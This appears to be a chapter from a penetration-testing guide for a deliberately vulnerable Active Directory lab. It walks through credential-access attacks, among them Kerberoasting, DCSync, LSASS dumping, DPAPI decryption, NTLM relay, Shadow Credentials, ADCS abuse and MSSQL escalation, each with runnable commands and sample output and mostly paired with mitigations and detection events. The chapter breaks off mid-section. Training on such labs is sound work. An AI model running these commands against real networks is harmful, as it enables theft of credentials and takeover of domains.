# 10 — Credential Access

You have **a** credential. You want **more**. This chapter covers the 65 CRED-* techniques in `PLAN.md`: roasting, DCSync, LSASS, DPAPI, coercion + relay, NTLM relay, cert abuse, MSSQL paths, gMSA, LAPS, and the rest.

We group by **mechanism** rather than CRED-ID so the *technique* sticks. Once you understand the mechanism, the flag mapping is mechanical.

---

## 10.0 (Concept) Credential taxonomy revisited

Recall from chapter 05 the credential triangle:

```
              plaintext password
                /              \
   one-way      |                | reversible-with-machinery
                v                v
         NT hash (MD4)        Kerberos keys (AES128/256, RC4)
                \              /
                 \            /
                  \          /
                  TGT, TGS, AP-REQ
                       |
                       |  (impersonation surface — pass-the-ticket)
                       v
```

Every CRED-* technique either:

1. **Steals a credential** in some form (hash, key, ticket, cert, vault item).
2. **Cracks it** offline (Kerberoast, AS-REP, NetNTLMv2, PFX).
3. **Forges it** (Golden, Silver, Diamond, Shadow Cred, Certifried).
4. **Replays it** (PTH, PTK, PTT, PTC — pass-the-cert).

Once you have **any one credential form** for an account, you can usually derive the others:

| You have | You can derive |
|----------|----------------|
| Plaintext | NT hash, AES128/256 keys (via salt), Kerberos tickets |
| NT hash | TGT (impacket-getTGT -hashes), NetNTLMv2 if you can be a client, NOT plaintext |
| AES256 key | TGT, AP-REQ on any service, NOT the NT hash (different KDF) |
| TGT | TGS for any service (S4U if needed), AS-REP-style impersonation |
| TGS | Service access for that one SPN, sometimes a re-extract of session key |
| Cert (.pfx) | TGT (PKINIT), NT hash (UnPAC-the-Hash) |
| Shadow Cred (msDS-KeyCredentialLink) | Cert → TGT → NT hash |
| NetNTLMv2 hash | Crackable to plaintext only; NOT directly usable for PTH |

The arrows above are the rest of this chapter.

### File-naming convention

```
~/dvad/loot/02-cred/
├── kerberoast/svc_jarvis.hash
├── kerberoast/svc_jarvis.cracked.txt
├── asreproast/svc_legacy.hash
├── dcsync/ntds.full.txt
├── dcsync/krbtgt.nt
├── lsass/file01-l.dmp
├── lsass/file01-pypykatz.txt
├── dpapi/peter.parker-vault.txt
├── relay/dc01.pfx
├── relay/dc01.nthash
├── shadow/sql01.pfx
├── shadow/sql01.nthash
├── adcs/<ESC>/<account>.{pfx,nt}
├── gmsa/svc_gmsa.nt
└── laps/file01.local-admin.txt
```

Always save the **raw** captured artifact AND the **derived** key form. You'll regret not having either when re-running a chain a day later.

---

## 10.1 Kerberoasting — CRED-001

### Vector

A user-account SPN means: that user is registered as a service principal. When **any** authenticated user requests a TGS for that SPN, the KDC returns a service ticket whose `enc-part` is encrypted with the **service account's long-term key** — which is derived from the password.

Crack the password offline. No interaction with the service. Stealthy.

### Why it exists

By design, Kerberos requires no privilege to request a TGS — you can request a ticket for any service. The vulnerability is that a *user* account (with a password humans pick) is being used as a service principal. A machine account would be safe (passwords are 240 random bytes), but service accounts have human-readable passwords like `Welcome2024!`.

### Prerequisites

- Any authenticated user credential.
- A user object with `servicePrincipalName` populated.
- Service account uses **RC4** (fast crack) OR **AES256** (slower but still feasible with rockyou for weak passwords).

### Discovery

```bash
# Via LDAP — find every kerberoastable account
ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
    -b 'DC=corp,DC=local' \
    '(&(samAccountType=805306368)(servicePrincipalName=*))' \
    samAccountName servicePrincipalName description memberOf

# Or via impacket (shorthand)
impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
```

You want the `sAMAccountName` + `servicePrincipalName` for each. Save to disk.

### Roast all

```bash
impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' \
    -dc-ip 10.10.0.10 \
    -request \
    -outputfile ~/dvad/loot/02-cred/kerberoast/all.hash
```

Hash format (mode 13100 = RC4, mode 19700 = AES256):

```
$krb5tgs$23$*svc_jarvis$CORP.LOCAL$cifs/sql01.corp.local*$10b9...$f7d3...0a1b
```

The `23` denotes RC4. `18` would denote AES256 (mode 19700).

### Force RC4 (the etype-downgrade trick)

If the account supports AES, the KDC will issue an AES-encrypted TGS by default — slower to crack. Modern KDCs let you select etypes via the AS-REQ. Impacket sets the requestor's supported etypes; setting them to RC4-only forces RC4:

```bash
# Impacket --request with --hashes uses RC4 by default
# To explicitly downgrade with Rubeus:
.\Rubeus.exe kerberoast /tgtdeleg /user:svc_jarvis /rc4opsec
```

Why this works: the KDC picks the strongest etype **both sides** support. If the requester advertises only RC4, RC4 wins — but the *service account* must have `msDS-SupportedEncryptionTypes` allowing RC4. Default user accounts do (legacy compat).

Mitigation: set `msDS-SupportedEncryptionTypes` on service accounts to AES-only (bit `0x18 = 24`).

### Targeted Kerberoast (CRED-009)

You have GenericWrite on a user → add an SPN → roast → revert:

```bash
# Add SPN
bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
         add objectAttribute victim_user servicePrincipalName 'cifs/anything.corp.local'

# Roast
impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request-user victim_user -outputfile victim.hash

# Remove SPN (housekeeping; not strictly required if you don't care about noise)
bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
         remove objectAttribute victim_user servicePrincipalName 'cifs/anything.corp.local'
```

### Crack

```bash
# RC4 — fast (modern GPU: hundreds of MH/s)
hashcat -m 13100 ~/dvad/loot/02-cred/kerberoast/all.hash \
        /usr/share/wordlists/rockyou.txt --status -o cracked.txt

# AES256 — slower but feasible for weak passwords
hashcat -m 19700 ~/dvad/loot/02-cred/kerberoast/all.hash \
        /usr/share/wordlists/rockyou.txt --status

# Add rules for sophistication
hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule

# Multi-wordlist + mask after rockyou
hashcat -m 13100 hashes rockyou.txt -r best64.rule
hashcat -m 13100 hashes -a 3 ?u?l?l?l?l?l?l?d?d?s
```

[Flag: CRED-001 — Kerberoast service account, CRED-009 — targeted Kerberoast]

### Detection signal (preview of chapter 13)

```
EventID 4769 (TGS issued)
  ServiceName: svc_jarvis$
  TicketEncryptionType: 0x17 (RC4 — anomalous if AES expected)
  AccountName: peter.parker
```

---

## 10.2 AS-REP Roasting — CRED-002

### Vector

If a user's `userAccountControl` has bit `0x400000` (`DONT_REQ_PREAUTH`) set, the KDC skips pre-authentication and **issues an AS-REP without verifying the requester knows the user's key**. The AS-REP's encrypted part contains the session key, encrypted with the user's long-term key. Crack offline → password.

### Why it exists

RFC 4120 (Kerberos v5) makes pre-auth *optional*. MIT-Kerberos clients with old configs don't send `PA-ENC-TIMESTAMP`. Microsoft preserved this for interop.

### Discovery

```bash
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' samAccountName
```

### Roast

```bash
# Authenticated (auto-finds all DONT_REQ_PREAUTH accounts)
impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile ~/dvad/loot/02-cred/asreproast/all.hash

# Unauthenticated (need a username list)
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 \
    -format hashcat -outputfile asrep.hash
```

Hash format (mode 18200):

```
$krb5asrep$23$peter.parker@CORP.LOCAL:c5...:fc...
```

### Crack

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r best64.rule
```

[Flag: CRED-002 — AS-REP roast, IA-019 — unauth variant]

### Detection signal

```
EventID 4768 (TGT issued)
  PreAuthType: 0
  Status: 0x0
  TargetUserName: peter.parker
```

`PreAuthType=0` is the giveaway.

---

## 10.3 DCSync — CRED-007

### Vector

`DRSUAPI::DRSGetNCChanges` is the replication call DCs make to each other. It returns the **full secret state** of any object: NT hash, AES keys, supplemental credentials, password history. Domain controllers have `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`, and `DS-Replication-Get-Changes-In-Filtered-Set` ACEs on the domain root.

A non-DC principal who has these ACEs can call DRSR and ask the DC for the data — DCSync. The DC will reply because the ACL says so.

### Discovery

```bash
# Find principals with DCSync ACEs
bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
         get dnsDump | jq '.[] | select(.ace_list[].right=="DS-Replication-Get-Changes-All")'

# Or via BloodHound: 'Find Principals with DCSync Rights' query.
```

### Execute

```bash
# Full dump (every account)
impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
    -outputfile ~/dvad/loot/02-cred/dcsync/ntds-full

# Target krbtgt only (smaller, quieter)
impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
    -just-dc-user krbtgt

# Target Administrator only
impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
    -just-dc-user Administrator

# With hash (instead of password)
impacket-secretsdump -hashes :<sync_user_NT> corp.local/doctor.strange@10.10.0.10 \
    -just-dc

# With Kerberos ticket
KRB5CCNAME=peter.parker.ccache impacket-secretsdump -k -no-pass \
    corp.local/doctor.strange@dc01.corp.local -just-dc
```

### Output format

```
domain.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad8f...c0e7:::
domain.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:c52c...fa::: (status=Enabled)
…
Kerberos keys for krbtgt:
  aes256-cts-hmac-sha1-96:b8d2...
  aes128-cts-hmac-sha1-96:a1c4...
  des-cbc-md5:11d4...
```

Format: `name:RID:LM:NT:::`. The LM is dummy (`aad3b435...`) when `NoLMHash=1` (default since Server 2008 R2).

### What you get

- Every user's NT hash → pass-the-hash to anyone, anywhere.
- krbtgt NT hash + AES keys → forge Golden Tickets (chapter 12).
- DC machine account hashes → pass-the-hash to other DCs.
- Trust account hashes → forge inter-realm TGTs (chapter 12).

[Flag: CRED-007 — DCSync any account, CRED-008 — krbtgt extract]

### Detection signal

```
EventID 4662
  ObjectName: DC=corp,DC=local
  Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   # DS-Replication-Get-Changes
              {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}   # DS-Replication-Get-Changes-All
  Accessing: doctor.strange (non-DC)
```

Defender for Identity flags this natively as "Suspected DCSync attack."

---

## 10.4 LSASS dumping (and the credential salad inside)

### What LSASS holds

LSASS (`lsass.exe`) is the Local Security Authority Subsystem. After a user authenticates, LSASS keeps credential material in memory:

| Provider | What's in memory |
|----------|------------------|
| **MSV1_0** (NTLM) | NT hash, sometimes LM hash |
| **Kerberos** | TGT, TGS, AES keys, sometimes password (if user typed at console) |
| **WDigest** | Plaintext password (only if `UseLogonCredential=1`) |
| **CredSSP / TsPkg** | Plaintext if user used `CredSSP` / fresh RDP |
| **LiveSSP / CloudAP** | Azure AD-related tokens |
| **DPAPI master keys** | The user-key form, derived from their plaintext |

### Methods to dump

Local admin required. Below in increasing stealth (1=loud, 5=stealthy):

1. **comsvcs.dll MiniDump** (loud — writes a 100MB file):

```powershell
Get-Process lsass | Select-Object -ExpandProperty Id
$pid = 644
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Users\Public\l.dmp full
```

2. **procdump** (Sysinternals signed — bypasses some AV):

```cmd
procdump.exe -accepteula -ma lsass.exe l.dmp
```

3. **mimikatz `sekurlsa::logonpasswords`** (live):

```
mimikatz# privilege::debug
mimikatz# token::elevate
mimikatz# sekurlsa::logonpasswords
```

4. **lsassy** (impacket-based, remote, no file on disk):

```bash
nxc smb 10.10.0.13 -u peter.parker -p 'DVADlab2024!' --local-auth -M lsassy
# Or with method selection:
lsassy -u peter.parker -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
```

5. **MalSecLogon / NanoDump / pypykatz live** (very stealthy):

```bash
nanodump.exe -w l.dmp --fork --duplicate
# Uses MalSecLogon trick: opens process via SeTcbPrivilege after impersonation
```

### Parse offline

```bash
pypykatz lsa minidump ~/dvad/loot/02-cred/lsass/l.dmp \
    > ~/dvad/loot/02-cred/lsass/parsed.txt

# Mimikatz-style on Windows
mimikatz# sekurlsa::minidump l.dmp
mimikatz# sekurlsa::logonpasswords full
```

Sample output:

```
== LogonSession ==
authentication_id 1234567 (12d687)
session_id 2
username svc_jarvis
domainname CORP
logon_server DC01
logon_time 2026-05-21T16:32:11
sid S-1-5-21-...-1116
secrets:
        == NT ==
                username svc_jarvis
                domain CORP
                lm_hash NA
                nt_hash 8846f7eaee8fb117ad06bdd830b7586c
        == Kerberos ==
                username svc_jarvis
                domain CORP.LOCAL
                password SqlServer123!         <-- WDigest leaked
```

### WDigest

DVAD enables `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=1`. The defender hardening is to **set it to 0** (default since Windows 8.1 / Server 2012 R2 for KB2871997 hosts).

Force it on (post-compromise persistence trick):

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

After the next interactive logon, WDigest re-caches plaintexts. **Forensic gift.**

### Special LSA secrets (cached creds, NL$KM, DefaultPassword)

```bash
impacket-secretsdump -system system.save -security security.save LOCAL
```

Output includes:

- **LSA secrets**: `$MACHINE.ACC` (machine account hash), service account hashes set via `Logon as a Service`, DefaultPassword (if autologon), `NL$KM` (cached domain creds key).
- **Cached domain credentials** (DCC2, mscash2 — hashcat mode 2100). One per recent interactive user.

[Flag: CRED-040 — LSASS NT hash; CRED-041 — WDigest plaintext; CRED-042 — LSA secrets; CRED-043 — DCC2 cached creds]

### Defenses to know

- **LSA Protection (`RunAsPPL=1`)** — only signed/protected processes can OpenProcess on lsass. Bypassable with a signed driver (RTCore64.sys, etc.) but raises the bar.
- **Credential Guard** — moves secrets into a VBS-isolated process. Reading lsass.exe yields encrypted garbage you cannot decrypt without the VTL-1 key.
- **Defender ASR rule**: "Block credential stealing from LSASS" — kills mimikatz-pattern OpenProcess.

---

## 10.5 DPAPI — the user-keyed cred vault

### What DPAPI protects

DPAPI (Data Protection API) encrypts per-user secrets:

- Browser saved passwords (Chrome, Edge — keyed off DPAPI master key, which then encrypts a localState key, which encrypts each cookie/password).
- Saved RDP credentials (`%APPDATA%\Microsoft\Credentials\`).
- WiFi keys.
- Outlook PST passwords.
- VPN passwords.
- Vault items (`%LOCALAPPDATA%\Microsoft\Vault\`).
- DPAPI-NG: gMSA passwords, Windows Hello PIN, modern LAPS encryption.

### Master keys

Per user, under:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>
```

Encrypted with a key derived from the user's plaintext password. **You need either:**

1. The user's plaintext (offline `dpapi::masterkey /sid:S-1-5-... /password:...`).
2. The user's NT hash + SID (offline `dpapi::masterkey /sid:S-1-5-... /hash:<NT>`).
3. The **domain backup key** (only Domain Admins have it — `mimikatz lsadump::backupkeys`).

### Backup key extraction (one-time per domain)

```bash
# As any DA-equivalent
impacket-dpapi backupkeys -t corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
    --export

# Saves backupkey.pvk
```

This key was generated at domain creation and **never rotates** (intentional — losing it would mean all DPAPI blobs become unrecoverable). It decrypts every user's master key, forever, in this domain.

### Decrypt chain

```bash
# 1. Master key file from the user's profile
impacket-dpapi masterkey \
    -file 'C:\Users\peter.parker\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>' \
    -pvk backupkey.pvk

# Output: master key = abc123...

# 2. Credential blob (saved RDP cred)
impacket-dpapi credential \
    -file 'C:\Users\peter.parker\AppData\Local\Microsoft\Credentials\<GUID>' \
    -key abc123...

# 3. Chrome / Edge
impacket-dpapi chrome \
    -file 'C:\Users\peter.parker\AppData\Local\Google\Chrome\User Data\Default\Login Data' \
    -key abc123...
```

`mimikatz` can do all the above on a live host:

```
mimikatz# dpapi::masterkey /in:<masterkey-file> /pvk:backupkey.pvk
mimikatz# dpapi::cred /in:<cred-file> /masterkey:<masterkey>
mimikatz# dpapi::chrome /in:<loginData> /masterkey:<masterkey>
```

### gMSA via DPAPI-NG

gMSA passwords arrive as a `msDS-ManagedPassword` blob — DPAPI-NG encrypted with a domain root key. `gMSADumper.py` decrypts them; gMSA membership decides whether you can read the blob in the first place.

[Flag: CRED-044 — DPAPI backup key, CRED-045 — DPAPI offline decrypt]

---

## 10.6 Coercion + NTLM relay — CRED-031 / -032 / -033

### Vector recap (chapter 05/06)

You can force a victim machine to authenticate to you via NTLM. You relay that authentication to a third party that accepts NTLM and does something useful. The relay only works if the third party does **not** enforce session signing / channel binding.

### Relay targets and their effects

| Target | Outcome |
|--------|---------|
| `smb://target` | Cmd as victim on target (if signing not required) — see chapter 11 |
| `ldap://dc` / `ldaps://dc` | Modify directory as victim — `--delegate-access` (RBCD), `--shadow-credentials`, `--add-computer`, `--escalate-user` |
| `http://ca/certsrv/` (ESC8) | Issue a cert for the victim → PKINIT → impersonate |
| `mssql://host` | SQL as victim |
| `imaps://exchange` | Mail access |
| `http://endpoint` (generic) | Web access as victim |
| `rpc://ca` (ESC11) | Cert issue via RPC instead of HTTP |
| `gc://dc:3268` | Cross-domain LDAP query |

### Coercion sources

Already detailed (chapter 09 / 06). Quick reference:

| Coercion | RPC interface | Authenticated? |
|----------|---------------|----------------|
| PetitPotam | MS-EFSR `\PIPE\efsrpc` | optional pre-patch; auth post-patch |
| SpoolSample | MS-RPRN spoolss | auth |
| DFSCoerce | MS-DFSNM | auth |
| ShadowCoerce | MS-FSRVP | auth |
| WebClient (PrinterBug v2) | WebDAV via HTTP | auth (any user that triggers a UNC) |

### Worked example — coerce DC + relay to LDAPS (RBCD on victim)

```bash
# Terminal 1 — listener
sudo ntlmrelayx.py \
    -t ldaps://dc01.corp.local \
    --delegate-access \
    --no-da \
    -smb2support \
    --output-file ~/dvad/loot/02-cred/relay/ntlmrelayx.txt

# Terminal 2 — coerce file01 to auth to us
python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
    attacker.corp.local 10.10.0.13
```

ntlmrelayx output:

```
[*] HTTPD: Received connection from 10.10.0.13, attacking target ldaps://dc01.corp.local
[*] Authenticating against ldaps://dc01.corp.local as CORP\FILE01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Attempting to create computer in: CN=Computers,DC=corp,DC=local
[*] Adding new computer with username: EVIL3$ and password: <random>
[*] Delegation rights modified successfully!
[*] EVIL3$ can now impersonate users on FILE01$ via S4U2Proxy
```

Then S4U2Self → admin shell on file01:

```bash
impacket-getST -spn cifs/file01.corp.local -impersonate Administrator \
    -dc-ip 10.10.0.10 'corp.local/EVIL3$:<random_pw>'

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass file01.corp.local
```

[Flag: CRED-031 — coerce + LDAPS relay → RBCD]

### Worked example — coerce DC + relay to ADCS HTTP (ESC8)

```bash
sudo ntlmrelayx.py \
    -t http://ca01.corp.local/certsrv/certfnsh.asp \
    --adcs --template DomainController \
    -smb2support \
    --output-file ~/dvad/loot/02-cred/relay/esc8.txt

python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
    attacker.corp.local 10.10.0.10
```

You get a `.pfx` for `DC01$`. PKINIT → DCSync → done.

[Flag: CRED-032 — coerce + HTTP CA relay (ESC8)]

### Worked example — coerce + relay to SMB (signing off)

```bash
sudo ntlmrelayx.py \
    -t smb://ws01.corp.local \
    -smb2support \
    -c 'powershell -enc <base64>' \
    --no-validate-privs

python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
    attacker.corp.local 10.10.0.100  # coerce ws01 → relay to ws01? No — coerce DIFFERENT host
```

Note: you cannot relay an auth back to the **same** machine that originated it (NTLM-reflection patch MS08-068). You must coerce hostA and relay to hostB.

[Flag: CRED-033 — coerce + SMB relay]

### Socks-mode relay

```bash
sudo ntlmrelayx.py -tf targets.txt --socks -smb2support
# Coerce many hosts. Each landed session becomes a SOCKS proxy entry:
[*] Servers started, waiting for connections
[*] SOCKS: Activated relay for user CORP/FILE01$ on file01.corp.local
```

Use via proxychains:

```bash
echo 'socks4 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
proxychains -q impacket-smbexec -no-pass corp.local/FILE01$@file01.corp.local
```

---

## 10.7 RBCD via MachineAccountQuota — CRED-019

### Vector recap

`MachineAccountQuota` (MAQ) defaults to 10 on the domain root. Any authenticated user can create up to 10 computer accounts. The created account is owned by that user → user has GenericAll on their own computer.

If you also have `GenericWrite` on a target computer object, you can:

1. Create your own computer (`EVIL$`).
2. Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target → `EVIL$`.
3. From `EVIL$`, S4U2Self for any user → S4U2Proxy → service ticket for the target as that user.

### Chain (full commands)

```bash
# Step 1 — make a computer
impacket-addcomputer 'corp.local/peter.parker:DVADlab2024!' \
    -dc-ip 10.10.0.10 \
    -computer-name 'EVIL$' \
    -computer-pass 'EvilPass1!'

# Step 2 — write RBCD on target
impacket-rbcd corp.local/peter.parker:'DVADlab2024!' \
    -dc-ip 10.10.0.10 \
    -delegate-from 'EVIL$' \
    -delegate-to 'FILE01$' \
    -action write

# Step 3 — S4U2Self for Administrator → S4U2Proxy for cifs/file01
impacket-getST -spn cifs/file01.corp.local \
    -impersonate Administrator \
    -dc-ip 10.10.0.10 \
    'corp.local/EVIL$:EvilPass1!'

# Step 4 — use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass file01.corp.local
```

### Discovery — finding GenericWrite paths

BloodHound query:

```cypher
MATCH p=(u:User)-[:GenericWrite|GenericAll|WriteOwner|WriteDacl]->(c:Computer)
WHERE u.enabled = true
RETURN u.name, c.name, type(relationships(p)[0])
```

### Verification

```bash
nxc smb file01.corp.local -k --use-kcache
nxc smb file01.corp.local -u Administrator -k --use-kcache --shares
```

### Mitigation

`MachineAccountQuota = 0` — single GPO. Stops the chain cold.

[Flag: CRED-019 — RBCD via MAQ]

### Detection

```
EventID 4741 (computer account created) by non-admin
EventID 5136 (directory service object modified)
  AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

## 10.8 Shadow Credentials — CRED-027

### Vector

`msDS-KeyCredentialLink` is a multi-value attribute holding **public keys** for PKINIT. If you can write to it, you can plant your own public key on the victim account. Then you PKINIT with the corresponding private key → TGT → UnPAC the NT hash.

Introduced for Windows Hello for Business (paired with the device's TPM-resident key). Defenders rarely audit it.

### Prerequisites

- Write access to `msDS-KeyCredentialLink` on the target. Common sources:
  - `GenericAll` / `GenericWrite` / `AllExtendedRights` on the target.
  - `WriteProperty` on `msDS-KeyCredentialLink` specifically (rare granular ACE).
- ADCS or a DC supporting PKINIT.

### One-shot via certipy

```bash
certipy shadow auto \
    -u peter.parker@corp.local -p 'DVADlab2024!' \
    -dc-ip 10.10.0.10 \
    -account 'sql01$'
```

Behind the scenes, this:

1. Generates a fresh keypair.
2. Builds a `KeyCredential` structure (KEY_USAGE = NGC, source = AzureAD-Joined Device).
3. Writes it into `msDS-KeyCredentialLink` on `sql01$`.
4. Performs PKINIT AS-REQ for `sql01$` with that private key.
5. Receives TGT + NT hash (via UnPAC).
6. Removes the planted credential (cleanup).

Output:

```
[*] Trying to read public key from user 'sql01$'
[*] Trying to add a new Key Credential Link to 'sql01$'
[*] Successfully added Key Credential Link to 'sql01$'
[*] Authenticating with PKINIT
[*] Got TGT
[*] Trying to retrieve NT hash for 'sql01$'
[*] Got hash for 'sql01$@corp.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
[*] Cleaning up Key Credential Link from 'sql01$'
```

### Manual flow (when certipy refuses)

```bash
# 1. Generate key + DeviceID
certipy shadow add -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
        -account 'sql01$' -out keycred.pfx

# 2. PKINIT
certipy auth -pfx keycred.pfx -dc-ip 10.10.0.10

# 3. Read the planted KeyCredentialLink (sanity-check)
certipy shadow list -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account 'sql01$'

# 4. Remove
certipy shadow remove -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
        -account 'sql01$' -device-id <device-guid>
```

### When the target is a user (not a computer)

Same. Works for any object writable to `msDS-KeyCredentialLink` that has a UPN.

[Flag: CRED-027 — Shadow Credentials]

### Mitigation

- Lock down ACLs on `msDS-KeyCredentialLink`.
- Enforce StrongCertificateBindingEnforcement = 2 (kills the UnPAC step's reliability for users without explicit mapping).

### Detection

```
EventID 5136 (directory service object modified)
  AttributeLDAPDisplayName: msDS-KeyCredentialLink
  ObjectClass: <target>
```

Defender for Identity flags writes to `msDS-KeyCredentialLink` from non-Hello-for-Business contexts.

---

## 10.9 ADCS template abuse — CRED-022..036

See chapter 06 for the full ESC catalogue. Quick reference of which DVAD CRED maps to which ESC (consult `PLAN.md` for the canonical mapping):

| CRED | ESC | Vector |
|------|-----|--------|
| CRED-022 | ESC1 | ENROLLEE_SUPPLIES_SUBJECT — SAN-spoof a privileged user |
| CRED-023 | ESC2 | Any Purpose EKU → any cert use |
| CRED-024 | ESC3 | Enrollment Agent → enroll on behalf of |
| CRED-025 | ESC4 | Template DACL writable → make it ESC1 |
| CRED-026 | ESC5/ESC7 | Adjacent ACL / CA-role abuse |
| CRED-028 | ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 → SAN-spoof in any request |
| CRED-029 | ESC8 | NTLM relay to web enrollment |
| CRED-030 | ESC9 | CT_FLAG_NO_SECURITY_EXTENSION → no SID binding |
| CRED-031 | ESC10 | Weak cert mapping registry → use any cert |
| CRED-032 | ESC11 | NTLM relay to RPC enrollment endpoint |
| CRED-033 | ESC13 | OIDToGroupLink → cert grants group membership |
| CRED-034 | ESC14 | altSecurityIdentities write → bind cert to user |
| CRED-035 | ESC15 (EKUwu) | CVE-2024-49019 — v1 template application policies |
| CRED-036 | ESC16 | DisableExtensionList → suppress security ext |
| CRED-037 | Certifried | CVE-2022-26923 — dNSHostName spoof to DC |

### Quick ESC1 worked example

```bash
# Find vulnerable template
certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable

# Enroll with SAN spoof
certipy req \
    -u peter.parker@corp.local -p 'DVADlab2024!' \
    -ca CORP-CA -target ca01.corp.local \
    -template VulnerableESC1 \
    -upn 'administrator@corp.local'

# Auth with the cert
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# Yields Administrator NT hash + TGT
```

### Quick Certifried (CVE-2022-26923) example

```bash
# Create computer
impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
    -computer-name 'EVIL$' -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10

# Set its dNSHostName to dc01.corp.local
bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
    set objectAttribute 'EVIL$' dNSHostName dc01.corp.local

# Enroll Machine template — cert will be issued to DC01's identity
certipy req -u 'EVIL$@corp.local' -p 'EvilPass1!' -ca CORP-CA \
    -template Machine -dc-ip 10.10.0.10

# PKINIT → DC TGT
certipy auth -pfx evil.pfx -dc-ip 10.10.0.10
```

Patch: KB5014754 (May 2022). Adds `szOID_NTDS_CA_SECURITY_EXT` to bind cert to SID. DVAD leaves the patch off.

---

## 10.10 MSSQL credential paths — CRED-050..060

### xp_cmdshell as SYSTEM (or service account)

```bash
impacket-mssqlclient corp.local/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth

1> SELECT IS_SRVROLEMEMBER('sysadmin')
1> EXEC sp_configure 'show advanced options', 1; RECONFIGURE
1> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE
1> EXEC xp_cmdshell 'whoami /all'
```

### xp_dirtree coercion → Responder

```sql
EXEC xp_dirtree '\\10.10.0.1\share', 1, 1
```

Triggers SMB auth from the MSSQL service account. Capture or relay.

### MSSQL impersonation chain

```sql
SELECT name FROM sys.server_principals WHERE type IN ('U','S','G')
-- find logins
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'
-- find IMPERSONATE grants
EXECUTE AS LOGIN = 'sa'
SELECT system_user
```

If you can `IMPERSONATE LOGIN sa`, you become sysadmin. PowerUpSQL automates the chain:

```powershell
Invoke-SQLAuditDefaultLoginPw -Verbose
Invoke-SQLAuditPrivImpersonateLogin -Verbose
Get-SQLServerLinkCrawl -Instance sql01 -Verbose
```

### TRUSTWORTHY chain

A database with `TRUSTWORTHY=ON` lets a privileged DB user execute as a higher-priv server user when crossing context:

```sql
USE master;
SELECT name, is_trustworthy_on FROM sys.databases
-- pick a TRUSTWORTHY db where you have db_owner
USE TrustworthyDb;
CREATE PROCEDURE pwn WITH EXECUTE AS OWNER AS
    EXEC ('CREATE LOGIN evil WITH PASSWORD = ''P@ss''; ALTER SERVER ROLE sysadmin ADD MEMBER evil')
EXEC pwn
```

### Linked server traversal

```sql
SELECT srvname, srvproduct, providername, datasource, isremote, rpcout
FROM master..sysservers

EXEC ('SELECT system_user') AT [LINKED_SERVER]
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

Linked servers form a graph. PowerUpSQL `Get-SQLServerLinkCrawl` walks it for you.

[Flag: CRED-050..062 cluster — MSSQL credential paths]

---

## 10.11 gMSA password read — CRED-024

### Vector recap

gMSA accounts hold a 240-byte random password. The KDC derives it from `msDS-ManagedPasswordId` + `msDS-ManagedPasswordPreviousId`. Principals listed in `msDS-GroupMSAMembership` (a security descriptor) can read the active blob via `msDS-ManagedPassword`.

### Discovery

```bash
$LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
    sAMAccountName msDS-GroupMSAMembership msDS-ManagedPasswordInterval
```

The `msDS-GroupMSAMembership` is a SDDL-encoded SD. To read it:

```bash
